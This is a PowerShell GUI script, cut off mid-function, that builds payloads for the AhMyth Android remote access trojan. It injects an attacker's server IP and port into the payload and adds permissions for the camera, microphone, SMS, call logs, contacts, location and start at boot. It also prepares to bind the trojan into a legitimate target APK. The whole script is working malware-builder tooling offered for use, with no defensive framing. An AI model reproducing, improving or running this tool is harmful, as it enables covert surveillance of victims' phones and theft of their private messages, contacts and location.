<#
  AhMyth Payload Studio - Stage 1 (UI + config layer)
  ---------------------------------------------------
  Independent WinForms GUI for building AhMyth payloads.
  - No hardcoded IP/port/paths: everything is read from gui-config.txt at startup
    and can be edited in the UI, then written back with the "Save config" button.
  - Uses an isolated JDK 11 for child processes only (JAVA_HOME/PATH), never
    touches system-wide configuration.
  Stage 1: UI skeleton, config load/save, path resolution, preflight check.
  Stage 2: standalone build pipeline.
  Stage 3: bind pipeline, BOOT method (aapt2 -> aapt1 fallback).
  Stage 4 (pending): bind pipeline, ACTIVITY method.
#>
$ErrorActionPreference = 'Stop'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

#region ---------- paths ----------
$script:Root    = Split-Path -Parent $MyInvocation.MyCommand.Path
$script:CfgFile = Join-Path $script:Root 'gui-config.txt'

function Get-AsciiWorkRoot {
    # apktool/aapt2 cannot handle non-ASCII paths -> the build workspace must be ASCII-safe.
    $candidate = Join-Path $env:USERPROFILE 'AhMyth'
    if ($candidate -match '[^\x00-\x7F]') { $candidate = 'C:\AhMyth' }
    return $candidate
}
$script:WorkRoot = Get-AsciiWorkRoot
#endregion

#region ---------- config ----------
$script:DefaultCfg = [ordered]@{
    IP        = ''
    PORT      = '16001'
    Mode      = 'standalone'
    Method    = 'BOOT'
    BindApk   = ''
    JdkPath   = ''
    OutDir    = ''
    Camera    = '1'
    Storage   = '1'
    Mic       = '1'
    Location  = '1'
    Contacts  = '1'
    SMS       = '1'
    CallsLogs = '1'
}

function Read-Config {
    $cfg = [ordered]@{}
    foreach ($k in $script:DefaultCfg.Keys) { $cfg[$k] = $script:DefaultCfg[$k] }
    if (Test-Path -LiteralPath $script:CfgFile) {
        Get-Content -LiteralPath $script:CfgFile -Encoding UTF8 | ForEach-Object {
            if ($_ -match '^\s*([A-Za-z][A-Za-z0-9_]*)\s*=\s*(.*)$') {
                $k = $Matches[1]; $v = $Matches[2].Trim()
                if ($cfg.Contains($k)) { $cfg[$k] = $v }
            }
        }
    }
    return $cfg
}

function Write-ConfigFile {
    param([Parameter(Mandatory)][hashtable]$Cfg)
    $Cfg = ConvertTo-CfgTable $Cfg
    $lines = @(
        '# ============================================================'
        '#  AhMyth Payload Studio - runtime config'
        '#  这个文件是唯一的配置来源，改完保存即可；也可以在界面里改后点「保存配置」写回。'
        '#  没有任何 IP/端口被写死进脚本，全部在运行时从这里读。'
        '# ============================================================'
        ''
        '# ---- 服务端连接（每次出包都注入这个地址，可随时改）----'
        ('IP={0}' -f $Cfg.IP)
        ('PORT={0}' -f $Cfg.PORT)
        ''
        '# ---- 构建模式：standalone | bind ----'
        ('Mode={0}' -f $Cfg.Mode)
        ''
        '# ---- 绑定模式的注入方法：BOOT | ACTIVITY ----'
        ('Method={0}' -f $Cfg.Method)
        ''
        '# ---- 绑定模式的目标 APK 路径（留空则每次在界面里选）----'
        ('BindApk={0}' -f $Cfg.BindApk)
        ''
        '# ---- JDK 11 路径（留空=自动探测）----'
        ('JdkPath={0}' -f $Cfg.JdkPath)
        ''
        '# ---- 输出目录（留空= %USERPROFILE%\AhMyth\Output）----'
        ('OutDir={0}' -f $Cfg.OutDir)
        ''
        '# ---- 权限开关（1=开 0=关）----'
        ('Camera={0}'    -f $Cfg.Camera)
        ('Storage={0}'   -f $Cfg.Storage)
        ('Mic={0}'       -f $Cfg.Mic)
        ('Location={0}'  -f $Cfg.Location)
        ('Contacts={0}'  -f $Cfg.Contacts)
        ('SMS={0}'       -f $Cfg.SMS)
        ('CallsLogs={0}' -f $Cfg.CallsLogs)
    )
    [System.IO.File]::WriteAllText($script:CfgFile, (($lines -join "`r`n") + "`r`n"), [System.Text.UTF8Encoding]::new($true))
}
#endregion

#region ---------- permission map (mirrors Constants.js checkboxMap) ----------
$script:PermMap = @{
    Camera    = @('android.permission.CAMERA','android.hardware.camera','android.hardware.camera.autofocus','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
    Storage   = @('android.permission.READ_EXTERNAL_STORAGE','android.permission.WRITE_EXTERNAL_STORAGE','android.permission.MANAGE_EXTERNAL_STORAGE','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
    Mic       = @('android.permission.RECORD_AUDIO','android.permission.MODIFY_AUDIO_SETTINGS','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
    Location  = @('android.permission.ACCESS_FINE_LOCATION','android.permission.ACCESS_COARSE_LOCATION','android.permission.ACCESS_BACKGROUND_LOCATION','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
    Contacts  = @('android.permission.READ_CONTACTS','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
    SMS       = @('android.permission.READ_SMS','android.permission.SEND_SMS','android.permission.RECEIVE_SMS','android.permission.WRITE_SMS','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
    CallsLogs = @('android.permission.READ_PHONE_STATE','android.permission.READ_CALL_LOG','android.permission.PROCESS_OUTGOING_CALLS','android.permission.WAKE_LOCK','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS','android.permission.RECEIVE_BOOT_COMPLETED')
}
$script:PermAll = @('android.permission.WAKE_LOCK','android.permission.CAMERA','android.permission.READ_EXTERNAL_STORAGE','android.permission.WRITE_EXTERNAL_STORAGE','android.permission.MANAGE_EXTERNAL_STORAGE','android.permission.WRITE_SETTINGS','android.permission.WRITE_SECURE_SETTINGS','android.permission.INTERNET','android.permission.ACCESS_NETWORK_STATE','android.permission.READ_SMS','android.permission.SEND_SMS','android.permission.RECEIVE_SMS','android.permission.WRITE_SMS','android.hardware.camera','android.hardware.camera.autofocus','android.permission.RECEIVE_BOOT_COMPLETED','android.permission.READ_PHONE_STATE','android.permission.READ_CALL_LOG','android.permission.PROCESS_OUTGOING_CALLS','android.permission.READ_CONTACTS','android.permission.RECORD_AUDIO','android.permission.MODIFY_AUDIO_SETTINGS','android.permission.ACCESS_FINE_LOCATION','android.permission.ACCESS_COARSE_LOCATION','android.permission.ACCESS_BACKGROUND_LOCATION','android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS')
$script:PermNames = @('Camera','Storage','Mic','Location','Contacts','SMS','CallsLogs')
#endregion

#region ---------- path resolution ----------
function Resolve-Jdk {
    param([string]$Configured)
    $cands = @()
    if ($Configured) { $cands += $Configured }
    $cands += (Join-Path $script:Root 'jdk11')          # deploy layout: <root>\jdk11\<version>
    $cands += (Join-Path (Split-Path -Parent $script:Root) 'jdk11')
    $cands += (Join-Path $env:USERPROFILE 'jdk11')
    foreach ($c in $cands) {
        if (-not $c) { continue }
        if (Test-Path -LiteralPath (Join-Path $c 'bin\java.exe')) { return $c }
        if (Test-Path -LiteralPath $c) {
            $sub = Get-ChildItem -LiteralPath $c -Directory -ErrorAction SilentlyContinue |
                   Where-Object { Test-Path (Join-Path $_.FullName 'bin\java.exe') } | Select-Object -First 1
            if ($sub) { return $sub.FullName }
        }
    }
    return ''
}

function Resolve-Factory {
    $cands = @(
        (Join-Path $script:Root 'AhMyth-Server\app\app\Factory'),
        (Join-Path (Split-Path -Parent $script:Root) 'AhMyth-Server\app\app\Factory'),
        (Join-Path $script:Root '..\AhMyth-Server\app\app\Factory')
    )
    foreach ($c in $cands) {
        if ($c -and (Test-Path -LiteralPath (Join-Path $c 'apktool.jar'))) {
            return (Resolve-Path -LiteralPath $c).Path
        }
    }
    return ''
}

function Hide-ConsoleWindow {
    # The .bat launcher runs through cmd.exe, which leaves a console window behind.
    # Hide it so the tool behaves like a normal GUI app (the WinForms window is unaffected).
    try {
        if (-not ('ConsoleHost' -as [type])) {
            $cs = 'using System;using System.Runtime.InteropServices;public class ConsoleHost{[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);}'
            Add-Type -TypeDefinition $cs -ErrorAction SilentlyContinue
        }
        $h = [ConsoleHost]::GetConsoleWindow()
        if ($h -ne [IntPtr]::Zero) { [void][ConsoleHost]::ShowWindow($h, 0) }
    } catch { }
}

function Get-JavaMajor {
    param([string]$JavaExe)
    # Native stderr must not become a terminating error under $ErrorActionPreference='Stop'
    # (PowerShell 5.1 quirk: `java -version` writes to stderr).
    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        $out = (& $JavaExe -version 2>&1 | Out-String)
        if ($out -match 'version "(\d+)') { return [int]$Matches[1] }
    } catch { }
    finally { $ErrorActionPreference = $prev }
    return -1
}
#endregion

#region ---------- UI ----------
$font   = New-Object System.Drawing.Font('Microsoft YaHei UI', 9)
$form   = New-Object System.Windows.Forms.Form
$form.Text          = 'AhMyth Payload Studio'
$form.ClientSize    = New-Object System.Drawing.Size(760, 668)
$form.Font          = $font
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedSingle'
$form.MaximizeBox   = $false

function New-Group([string]$text, [int]$x, [int]$y, [int]$w, [int]$h) {
    $g = New-Object System.Windows.Forms.GroupBox
    $g.Text = $text; $g.Location = New-Object System.Drawing.Point($x, $y)
    $g.Size = New-Object System.Drawing.Size($w, $h)
    return $g
}

# --- 1. mode ---
$grpMode = New-Group '1. 构建模式' 12 8 736 62
$rbStandalone = New-Object System.Windows.Forms.RadioButton
$rbStandalone.Text = '独立载荷 (standalone)'; $rbStandalone.Location = New-Object System.Drawing.Point(16, 26)
$rbStandalone.AutoSize = $true
$rbBind = New-Object System.Windows.Forms.RadioButton
$rbBind.Text = '绑定自定义 APK (bind)'; $rbBind.Location = New-Object System.Drawing.Point(220, 26)
$rbBind.AutoSize = $true
$grpMode.Controls.AddRange(@($rbStandalone, $rbBind))

# --- 2. bind target ---
$grpBind = New-Group '2. 目标 APK（仅绑定模式）' 12 76 736 92
$lblApk = New-Object System.Windows.Forms.Label
$lblApk.Text = 'APK 路径'; $lblApk.Location = New-Object System.Drawing.Point(14, 28); $lblApk.AutoSize = $true
$tbApk = New-Object System.Windows.Forms.TextBox
$tbApk.Location = New-Object System.Drawing.Point(78, 25); $tbApk.Size = New-Object System.Drawing.Size(556, 24)
$btnBrowse = New-Object System.Windows.Forms.Button
$btnBrowse.Text = '浏览...'; $btnBrowse.Location = New-Object System.Drawing.Point(644, 24); $btnBrowse.Size = New-Object System.Drawing.Size(76, 26)
$lblMethod = New-Object System.Windows.Forms.Label
$lblMethod.Text = '注入方法'; $lblMethod.Location = New-Object System.Drawing.Point(14, 60); $lblMethod.AutoSize = $true
$rbBoot = New-Object System.Windows.Forms.RadioButton
$rbBoot.Text = 'BOOT（开机自启，不改入口类）'; $rbBoot.Location = New-Object System.Drawing.Point(78, 58); $rbBoot.AutoSize = $true
$rbActivity = New-Object System.Windows.Forms.RadioButton
$rbActivity.Text = 'ACTIVITY（Hook 启动类）'; $rbActivity.Location = New-Object System.Drawing.Point(330, 58); $rbActivity.AutoSize = $true
$grpBind.Controls.AddRange(@($lblApk, $tbApk, $btnBrowse, $lblMethod, $rbBoot, $rbActivity))

# --- 3. connection ---
$grpConn = New-Group '3. 服务端连接（注入到载荷，可随时改）' 12 174 736 62
$lblIp = New-Object System.Windows.Forms.Label
$lblIp.Text = 'IP 地址'; $lblIp.Location = New-Object System.Drawing.Point(14, 28); $lblIp.AutoSize = $true
$tbIp = New-Object System.Windows.Forms.TextBox
$tbIp.Location = New-Object System.Drawing.Point(78, 25); $tbIp.Size = New-Object System.Drawing.Size(230, 24)
$lblPort = New-Object System.Windows.Forms.Label
$lblPort.Text = '端口'; $lblPort.Location = New-Object System.Drawing.Point(330, 28); $lblPort.AutoSize = $true
$tbPort = New-Object System.Windows.Forms.TextBox
$tbPort.Location = New-Object System.Drawing.Point(378, 25); $tbPort.Size = New-Object System.Drawing.Size(100, 24)
$lblHint = New-Object System.Windows.Forms.Label
$lblHint.Text = '（留空的 IP 无法出包；配置只在运行时读取）'
$lblHint.Location = New-Object System.Drawing.Point(492, 28); $lblHint.AutoSize = $true
$lblHint.ForeColor = [System.Drawing.Color]::Gray
$grpConn.Controls.AddRange(@($lblIp, $tbIp, $lblPort, $tbPort, $lblHint))

# --- 4. permissions ---
$grpPerm = New-Group '4. 权限注入' 12 242 736 96
$script:PermBoxes = [ordered]@{}
$px = 16
foreach ($n in $script:PermNames) {
    $cb = New-Object System.Windows.Forms.CheckBox
    $cb.Text = $n; $cb.Location = New-Object System.Drawing.Point($px, 28); $cb.AutoSize = $true
    $grpPerm.Controls.Add($cb)
    $script:PermBoxes[$n] = $cb
    $px += 100
}
$lblPermHint = New-Object System.Windows.Forms.Label
$lblPermHint.Text = '全开或全关 = 完整权限表（与原版 GUI 行为一致）'
$lblPermHint.Location = New-Object System.Drawing.Point(16, 58); $lblPermHint.AutoSize = $true
$lblPermHint.ForeColor = [System.Drawing.Color]::Gray
$grpPerm.Controls.Add($lblPermHint)

# --- buttons ---
$btnBuild = New-Object System.Windows.Forms.Button
$btnBuild.Text = '生成 Payload'; $btnBuild.Location = New-Object System.Drawing.Point(12, 346); $btnBuild.Size = New-Object System.Drawing.Size(150, 32)
$btnBuild.BackColor = [System.Drawing.Color]::FromArgb(46, 139, 87); $btnBuild.ForeColor = [System.Drawing.Color]::White
$btnSave = New-Object System.Windows.Forms.Button
$btnSave.Text = '保存配置'; $btnSave.Location = New-Object System.Drawing.Point(172, 346); $btnSave.Size = New-Object System.Drawing.Size(110, 32)
$btnOut = New-Object System.Windows.Forms.Button
$btnOut.Text = '打开输出目录'; $btnOut.Location = New-Object System.Drawing.Point(292, 346); $btnOut.Size = New-Object System.Drawing.Size(120, 32)
$btnClear = New-Object System.Windows.Forms.Button
$btnClear.Text = '清空日志'; $btnClear.Location = New-Object System.Drawing.Point(422, 346); $btnClear.Size = New-Object System.Drawing.Size(100, 32)

# --- log ---
$grpLog = New-Group '日志' 12 384 736 258
$script:LogBox = New-Object System.Windows.Forms.RichTextBox
$script:LogBox.Location = New-Object System.Drawing.Point(12, 24)
$script:LogBox.Size = New-Object System.Drawing.Size(712, 222)
$script:LogBox.ReadOnly = $true
$script:LogBox.BackColor = [System.Drawing.Color]::FromArgb(24, 24, 24)
$script:LogBox.ForeColor = [System.Drawing.Color]::Gainsboro
$script:LogBox.Font = New-Object System.Drawing.Font('Consolas', 9)
$script:LogBox.WordWrap = $true
$script:LogBox.ScrollBars = 'Vertical'
$grpLog.Controls.Add($script:LogBox)

$status = New-Object System.Windows.Forms.StatusStrip
$statusLabel = New-Object System.Windows.Forms.ToolStripStatusLabel
$statusLabel.Text = '就绪'
$status.Items.Add($statusLabel) | Out-Null

$form.Controls.AddRange(@($grpMode, $grpBind, $grpConn, $grpPerm, $btnBuild, $btnSave, $btnOut, $btnClear, $grpLog, $status))
#endregion

#region ---------- log ----------
function Write-Log {
    param([string]$Message = '', [ValidateSet('INFO','OK','FAIL','WARN','STEP')][string]$Level = 'INFO')
    $color = switch ($Level) {
        'OK'   { [System.Drawing.Color]::LimeGreen }
        'FAIL' { [System.Drawing.Color]::Tomato }
        'WARN' { [System.Drawing.Color]::Orange }
        'STEP' { [System.Drawing.Color]::DeepSkyBlue }
        default { [System.Drawing.Color]::Gainsboro }
    }
    $script:LogBox.SelectionStart  = $script:LogBox.TextLength
    $script:LogBox.SelectionLength = 0
    $script:LogBox.SelectionColor  = $color
    $script:LogBox.AppendText($Message + "`r`n")
    $script:LogBox.SelectionColor  = $script:LogBox.ForeColor
    $script:LogBox.ScrollToCaret()
    [System.Windows.Forms.Application]::DoEvents()
}
#endregion

#region ---------- UI <-> config ----------
function Load-UiFromCfg {
    param([hashtable]$Cfg)
    $Cfg = ConvertTo-CfgTable $Cfg
    $tbIp.Text = [string]$Cfg.IP
    $tbPort.Text = [string]$Cfg.PORT
    $tbApk.Text = [string]$Cfg.BindApk
    if ($Cfg.Mode -eq 'bind') { $rbBind.Checked = $true } else { $rbStandalone.Checked = $true }
    if ($Cfg.Method -eq 'ACTIVITY') { $rbActivity.Checked = $true } else { $rbBoot.Checked = $true }
    foreach ($n in $script:PermBoxes.Keys) {
        $script:PermBoxes[$n].Checked = ([string]$Cfg[$n] -eq '1')
    }
}

function Get-CfgFromUi {
    $c = [ordered]@{}
    $c.IP        = $tbIp.Text.Trim()
    $c.PORT      = $tbPort.Text.Trim()
    $c.Mode      = if ($rbBind.Checked) { 'bind' } else { 'standalone' }
    $c.Method    = if ($rbActivity.Checked) { 'ACTIVITY' } else { 'BOOT' }
    $c.BindApk   = $tbApk.Text.Trim()
    $c.JdkPath   = [string]$script:Cfg.JdkPath
    $c.OutDir    = [string]$script:Cfg.OutDir
    foreach ($n in $script:PermNames) { $c[$n] = if ($script:PermBoxes[$n].Checked) { '1' } else { '0' } }
    return $c
}

function ConvertTo-CfgTable {
    # A hashtable literal is case-insensitive, but the parameter binder converts an
    # OrderedDictionary ([ordered]@{}) through Hashtable(IDictionary), which is CASE-SENSITIVE.
    # Normalizing at every entry point keeps $Cfg.<Key> resolving whatever casing the caller used.
    param([Parameter(Mandatory)]$Cfg)
    $h = New-Object System.Collections.Hashtable ([System.StringComparer]::OrdinalIgnoreCase)
    foreach ($k in @($Cfg.Keys)) { $h[[string]$k] = $Cfg[$k] }
    return $h
}

function Get-SelectedPermissions {
    $on = @($script:PermNames | Where-Object { $script:PermBoxes[$_].Checked })
    if ($on.Count -eq 0 -or $on.Count -eq $script:PermNames.Count) { return $script:PermAll }
    return @($on | ForEach-Object { $script:PermMap[$_] } | Select-Object -Unique)
}

function Update-Enabled {
    $b = $rbBind.Checked
    $tbApk.Enabled = $b; $btnBrowse.Enabled = $b; $rbBoot.Enabled = $b; $rbActivity.Enabled = $b
}
#endregion

#region ---------- preflight ----------
function Invoke-Preflight {
    param([hashtable]$Cfg)
    $Cfg = ConvertTo-CfgTable $Cfg
    $ok = $true

    Write-Log '──── 预检 ────' 'STEP'

    # 1) connection
    if (-not $Cfg.IP) { Write-Log '[x] IP 为空，请在「服务端连接」填写' 'FAIL'; $ok = $false }
    elseif ($Cfg.IP -notmatch '^(\d{1,3}\.){3}\d{1,3}$' -and $Cfg.IP -notmatch '^[A-Za-z0-9\.\-]+$') {
        Write-Log ('[x] IP 格式可疑: ' + $Cfg.IP) 'FAIL'; $ok = $false
    } else {
        Write-Log ('[✓] 连接目标: http://{0}:{1}' -f $Cfg.IP, $Cfg.PORT) 'OK'
    }
    if (-not $Cfg.PORT -or $Cfg.PORT -notmatch '^\d+$') { Write-Log '[x] 端口必须是数字' 'FAIL'; $ok = $false }

    # 2) factory + jars
    $factory = Resolve-Factory
    if (-not $factory) { Write-Log '[x] 找不到 Factory 目录（..\AhMyth-Server\app\app\Factory）' 'FAIL'; $ok = $false }
    else {
        Write-Log ('[✓] Factory: ' + $factory) 'OK'
        foreach ($j in 'apktool.jar', 'sign.jar') {
            if (Test-Path -LiteralPath (Join-Path $factory $j)) { Write-Log ('[✓] ' + $j) 'OK' }
            else { Write-Log ('[x] 缺少 ' + $j) 'FAIL'; $ok = $false }
        }
        $src = Join-Path $factory 'Ahmyth'
        if (Test-Path -LiteralPath (Join-Path $src 'AndroidManifest.xml')) { Write-Log '[✓] 载荷模板 Factory\Ahmyth 完整' 'OK' }
        else { Write-Log '[x] 载荷模板 Factory\Ahmyth 不完整' 'FAIL'; $ok = $false }
    }

    # 3) jdk
    $jdk = Resolve-Jdk $Cfg.JdkPath
    if (-not $jdk) { Write-Log '[x] 找不到 JDK 11（可在 gui-config.txt 的 JdkPath 指定）' 'FAIL'; $ok = $false }
    else {
        $major = Get-JavaMajor (Join-Path $jdk 'bin\java.exe')
        if ($major -ne 11) { Write-Log ('[x] JDK 版本必须是 11，当前检测到 ' + $major) 'FAIL'; $ok = $false }
        else { Write-Log ('[✓] JDK 11: ' + $jdk) 'OK' }
    }

    # 4) mode specific
    if ($Cfg.Mode -eq 'bind') {
        if (-not $Cfg.BindApk) { Write-Log '[x] 绑定模式必须选择目标 APK' 'FAIL'; $ok = $false }
        elseif (-not (Test-Path -LiteralPath $Cfg.BindApk)) { Write-Log ('[x] 目标 APK 不存在: ' + $Cfg.BindApk) 'FAIL'; $ok = $false }
        elseif ($Cfg.BindApk -notmatch '\.apk$') { Write-Log '[x] 目标文件不是 .apk' 'FAIL'; $ok = $false }
        else { Write-Log ('[✓] 目标 APK: ' + (Split-Path -Leaf $Cfg.BindApk)) 'OK' }
        Write-Log ('[✓] 注入方法: ' + $Cfg.Method) 'OK'
    }

    # 5) workspace + output
    Write-Log ('[✓] 工作目录(ASCII): ' + $script:WorkRoot) 'OK'
    $perms = Get-SelectedPermissions
    Write-Log ('[✓] 权限: {0} 条 ({1})' -f $perms.Count, (($script:PermNames | Where-Object { $script:PermBoxes[$_].Checked }) -join ',')) 'OK'

    if ($ok) { Write-Log '[✓] 预检通过' 'OK' } else { Write-Log '[x] 预检未通过，请按上面提示修正' 'FAIL' }
    return $ok
}
#endregion

#region ---------- build helpers ----------
function Get-LogTail {
    param([string]$Text, [int]$Lines = 12)
    if ([string]::IsNullOrWhiteSpace($Text)) { return '(no output)' }
    $arr = @($Text -split "`r?`n" | Where-Object { $_ -ne '' })
    return (($arr | Select-Object -Last $Lines) -join "`r`n")
}

function Invoke-JavaTool {
    # Runs a java tool as a child process while keeping the WinForms UI repainting.
    # Uses System.Diagnostics.Process directly: Start-Process -PassThru does NOT reliably
    # populate ExitCode in Windows PowerShell 5.1 when output is redirected.
    param(
        [Parameter(Mandatory)][string]$JavaExe,
        [Parameter(Mandatory)][string[]]$JavaArgs,
        [Parameter(Mandatory)][string]$WorkingDirectory,
        [Parameter(Mandatory)][string]$StageName
    )
    $argLine = ($JavaArgs | ForEach-Object { if ($_ -match '\s') { '"' + $_ + '"' } else { $_ } }) -join ' '

    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName               = $JavaExe
    $si.Arguments              = $argLine
    $si.WorkingDirectory       = $WorkingDirectory
    $si.UseShellExecute        = $false
    $si.RedirectStandardOutput = $true
    $si.RedirectStandardError  = $true
    $si.CreateNoWindow         = $true

    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo = $si
    [void]$proc.Start()
    $outTask = $proc.StandardOutput.ReadToEndAsync()
    $errTask = $proc.StandardError.ReadToEndAsync()

    while (-not $proc.HasExited) {
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 120
    }
    $proc.WaitForExit()
    $stdout = $outTask.Result
    $stderr = $errTask.Result
    $code = $proc.ExitCode
    $proc.Dispose()

    return @{ Code = $code; StdOut = $stdout; StdErr = $stderr }
}

function Initialize-WorkCopy {
    # apktool/aapt2 cannot read non-ASCII paths, so every build runs on an ASCII copy.
    # The Factory source is never modified: injection happens on the copy only.
    param([Parameter(Mandatory)][string]$SourceDir, [Parameter(Mandatory)][string]$TargetDir)
    if (Test-Path -LiteralPath $TargetDir) { [System.IO.Directory]::Delete($TargetDir, $true) }
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
    Get-ChildItem -LiteralPath $SourceDir -Force | ForEach-Object {
        Copy-Item -LiteralPath $_.FullName -Destination $TargetDir -Recurse -Force
    }
    $stale = Join-Path $TargetDir 'build'
    if (Test-Path -LiteralPath $stale) { [System.IO.Directory]::Delete($stale, $true) }
}

function Set-SmaliEndpoint {
    # Ip/Port are validated here rather than with [Parameter(Mandatory)]: binding an empty
    # value would throw a raw "empty string" error before any readable message could print.
    param([Parameter(Mandatory)][string]$BuildDir, [string]$Ip, [string]$Port)
    if (-not $Ip) {
        Write-Log '[x] 连接地址无效: IP 为空，请在「服务端连接」填写' 'FAIL'
        return $false
    }
    if ($Port -notmatch '^\d{1,5}$') {
        Write-Log ('[x] 端口无效: "{0}"，必须是 1-5 位数字' -f $Port) 'FAIL'
        return $false
    }
    $smali = Join-Path $BuildDir 'smali\ahmyth\mine\king\ahmyth\e.smali'
    if (-not (Test-Path -LiteralPath $smali)) {
        Write-Log ('[x] 载荷模板缺少 e.smali: ' + $smali) 'FAIL'
        return $false
    }
    $endpoint = 'http://{0}:{1}' -f $Ip, $Port
    $text = [System.IO.File]::ReadAllText($smali)
    # matches "http://host:port" and stops before the "?model=" query suffix
    $updated = [regex]::Replace($text, 'http://[^?"]+', $endpoint)
    [System.IO.File]::WriteAllText($smali, $updated, [System.Text.UTF8Encoding]::new($false))
    Write-Log ('[OK] 连接地址已写入 e.smali: ' + $endpoint) 'OK'
    return $true
}

function Set-ManifestPermissions {
    # Replaces the whole uses-permission / uses-feature block, mirroring the original GUI
    # standalone behaviour (the template is ours, so replacing is the intended semantics).
    param([Parameter(Mandatory)][string]$BuildDir, [Parameter(Mandatory)][string[]]$Permissions)
    $manifest = Join-Path $BuildDir 'AndroidManifest.xml'
    if (-not (Test-Path -LiteralPath $manifest)) { return 0 }
    $permLines = foreach ($perm in $Permissions) {
        if ($perm -like 'android.hardware.*') { '<uses-feature android:name="{0}"/>' -f $perm }
        else { '<uses-permission android:name="{0}"/>' -f $perm }
    }
    $block = (($permLines -join "`r`n") + "`r`n")
    $xml = [System.IO.File]::ReadAllText($manifest)
    $xml = [regex]::Replace($xml, '(?m)^[ \t]*<uses-(permission|feature)[^>]*/>\r?\n', '')
    $idx = $xml.IndexOf('<application')
    if ($idx -lt 0) { return 0 }
    $xml = $xml.Substring(0, $idx) + $block + $xml.Substring($idx)
    [System.IO.File]::WriteAllText($manifest, $xml, [System.Text.UTF8Encoding]::new($false))
    return $Permissions.Count
}

function Copy-DirectoryMerge {
    # Copies the CONTENTS of $Source into $Destination, overwriting existing files
    # (Copy-Item -Recurse would otherwise nest the source folder inside the target).
    param([Parameter(Mandatory)][string]$Source, [Parameter(Mandatory)][string]$Destination)
    if (-not (Test-Path -LiteralPath $Destination)) {
        New-Item -ItemType Directory -Path $Destination -Force | Out-Null
    }
    Get-ChildItem -LiteralPath $Source -Force | ForEach-Object {
        Copy-Item -LiteralPath $_.FullName -Destination $Destination -Recurse -Force
    }
}

function Get-NextSmaliDirName {
    # Mirrors AppCtrl.js createPayloadDirectory(): pick the next free dex group
    # (smali -> smali_classes2 -> smali_classes3 ...) so the payload never collides
    # with the target app's own smali folders.
    # NOTE: upstream has a parsing bug here ([1] of the token list is "classes", so the
    # number becomes NaN). This version parses the trailing digits properly.
    param([Parameter(Mandatory)][string]$Dir)
    $ignore = @('original','res','build','kotlin','lib','assets','META-INF','unknown','smali_assets')
    $names = @(Get-ChildItem -LiteralPath $Dir -Directory -Force -ErrorAction SilentlyContinue |
               Where-Object { $ignore -notcontains $_.Name } |
               Select-Object -ExpandProperty Name)
    $max = 0
    foreach ($n in $names) {
        if ($n -eq 'smali') { if ($max -lt 1) { $max = 1 } }
        elseif ($n -match '^smali_classes(\d+)$') { $v = [int]$Matches[1]; if ($v -gt $max) { $max = $v } }
    }
    if ($max -lt 1) { return 'smali_classes2' }   # no smali dir at all
    return ('smali_classes{0}' -f ($max + 1))
}

function Get-AndroidNsPrefix {
    param([Parameter(Mandatory)][string]$Xml)
    $m = [regex]::Match($Xml, 'xmlns:([A-Za-z_][\w\-]*)\s*=\s*"http://schemas\.android\.com/apk/res/android"')
    if ($m.Success) { return $m.Groups[1].Value }
    return 'android'
}

function Add-ManifestPermissions {
    # BIND semantics: additive. The target app keeps its own permissions; we only append
    # the ones it does not declare yet (mirrors AppCtrl.js modifyManifest).
    param([Parameter(Mandatory)][string]$ManifestPath, [Parameter(Mandatory)][string[]]$Permissions)
    $xml = [System.IO.File]::ReadAllText($ManifestPath)
    $ns  = Get-AndroidNsPrefix $xml
    $pattern = '<uses-(?:permission|feature)\b[^>]*?' + [regex]::Escape($ns) + ':name\s*=\s*"([^"]+)"'
    $existing = New-Object 'System.Collections.Generic.HashSet[string]'
    foreach ($m in [regex]::Matches($xml, $pattern)) { [void]$existing.Add($m.Groups[1].Value) }

    $toAdd = @($Permissions | Where-Object { -not $existing.Contains($_) })
    if ($toAdd.Count -gt 0) {
        $lines = foreach ($perm in $toAdd) {
            if ($perm -like 'android.hardware.*') { '    <uses-feature {0}:name="{1}"/>' -f $ns, $perm }
            else { '    <uses-permission {0}:name="{1}"/>' -f $ns, $perm }
        }
        $block = (($lines -join "`r`n") + "`r`n")
        $mm = [regex]::Match($xml, '<application[\s>]')
